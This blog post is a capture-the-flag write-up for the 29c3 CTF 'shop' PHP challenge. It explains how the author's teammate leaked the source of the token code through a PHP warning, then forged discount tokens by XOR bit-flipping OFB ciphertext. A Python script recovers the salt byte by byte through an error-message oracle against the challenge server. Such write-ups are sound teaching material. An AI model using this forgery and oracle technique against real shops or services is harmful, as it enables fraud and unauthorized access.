---
title: 29c3ctf shop writeup
author: zTrix
layout: post
permalink: /29c3ctf-shop-writeup/
categories:
  - CTF
  - writeup
---
This problem is solved by jay. I write this writeup to admire his work!

This a php web problem. After diving into the website, we found that, it&#8217;s a online shop, with 2 items in it, but the account balance is 0, however we can have some bonus code the reduce the price by 5, so we can by the unimportant note, which shows file not found. So we can deduce that if we have a 1337 bonus to buy the important note, we can have the flag.

Scan this website(use wvs, wwwscan, nikto, etc), we can get http://94.45.252.234/free.php , which can generate 5 bonus for us. Then somebody tried some malformed bonus token, such as FpqIyUuxZClovPxTaXfWHGEKeNBOBE892V59/fYAvON/MmQV , at the top of the page, a php warning shows, revealing another page: http://94.45.252.234/reduction.inc

The code in reduction.inc shows how token are generated and verified. So we need to construct another token of 1337 bonus to crack it. Note that, the crypto method uses ofb mode, which is very weak. The [wiki][1] has a simple illustration on how it works. Actually, we don&#8217;t need the key and iv to do encryption, what we need is the original plain text, then we can construct new encryption using xor operation: (original&#95;encyption xor original&#95;plain&#95;text xor new&#95;plain_text). The original plain text is &#8220;$salt.5.1&#8243; So we only need the salt, which is 16 bytes long, indicated by 3-DES. And this is where I got stucked.

But jay solved this problem using a python script:

    import binascii, base64;
    import urllib
    import urllib2
    
    enc_salt= "169a88c94bb1642968bcfc536977d61c";
    tail = "730af8d0955fc1fbfbfa3540cd9f10b68f93c85233";
    
    
    def gen_reduction(byte_index, mask):
           enc_salt_bin = binascii.unhexlify(enc_salt);
           left = enc_salt[0:2*byte_index];
           middle = enc_salt[2*byte_index:2*byte_index+2];
           right = enc_salt[2*byte_index+2:32];
           middle = hex(mask ^ (16*int(middle[:1], 16) + int(middle[1:], 16)));
           middle = middle[2:];
           if(1==len(middle)):
                   middle = '0' + middle;
           reduction = binascii.unhexlify(left + middle + right + tail);
           return base64.b64encode(reduction);
    
    def test_reduction(byte_index, mask):
           url = 'http://94.45.252.234/cart.php'
           user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
           values = {'reduction' : gen_reduction(byte_index, mask),
                    'Add Bonus Code' : 'True'
                   }
           headers = { 'User-Agent' : user_agent }
    
           data = urllib.urlencode(values)
           req = urllib2.Request(url, data, headers)
           response = urllib2.urlopen(req)
           page = response.read()
           if('h' == page[1]):
                   return 1;
           return 0;
    
    for i in range(16):
           salt = "";
           for j in range(1,256):
                   if(1 == test_reduction(i,j)):
                           byte = hex(j ^ 0x2e);
                           print byte
    

This script is a little complicated. It reduces the attempt time of cracking salt from 256^16 down to 256*16. The important thing is that, the server will response with warning notice when we construct a fake bonus token which contains less than 2 period symbols, which is caused by following line:

        list($in_salt, $amount, $rnd) = explode('.', $reduction);
    

This also tells us, the salt does not contain period symbol. So we can construct a fake token which contains only 1 period symbol first, then try to translate each char of the salt to period, if success, then there will be no warning, otherwise there will be php complaint:

    Notice: Undefined offset: 2 in /var/www/reduction.inc on line 21
    

So we can get 1 char in 256 attempt. This is how the python script works.

After cracking the salt, we already knows how to construct the encryption, and md5 is also straight-forward.

Admire jay again! Any comments?

 [1]: http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation